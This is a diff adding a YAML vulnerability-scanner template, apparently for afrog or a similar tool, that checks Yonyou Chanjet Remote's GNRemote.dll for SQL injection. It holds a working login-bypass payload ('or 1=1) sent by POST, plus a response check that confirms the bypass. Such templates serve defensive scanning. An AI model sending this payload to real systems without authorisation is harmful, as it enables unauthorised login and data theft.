@@ -1,0 +1,21 @@
+id: yonyou-chanjet-gnremote-sql-inject
+
+info:
+  name: 用友 畅捷通远程通 GNRemote.dll SQL注入漏洞
+  author: zan8in
+  severity: high
+  description: |
+    用友 畅捷通远程通 GNRemote.dll SQL注入漏洞，攻击者通过SQL注入可以获取服务器敏感信息或者使用万能密码登录设备
+    body="远程通CHANJET_Remote"
+  reference:
+    - http://wiki.peiqi.tech/wiki/webapp/%E7%94%A8%E5%8F%8B/%E7%94%A8%E5%8F%8B%20%E7%95%85%E6%8D%B7%E9%80%9A%E8%BF%9C%E7%A8%8B%E9%80%9A%20GNRemote.dll%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /GNRemote.dll?GNFunction=LoginServer&decorator=text_wrap&frombrowser=esl
+      body: |
+        username=%22'%20or%201%3d1%3b%22&password=%018d8cbc8bfc24f018&ClientStatus=1
+    expression: response.status == 200 && '"RetCode":(\\s*?)0'.bmatches(response.body)
+expression: r0()
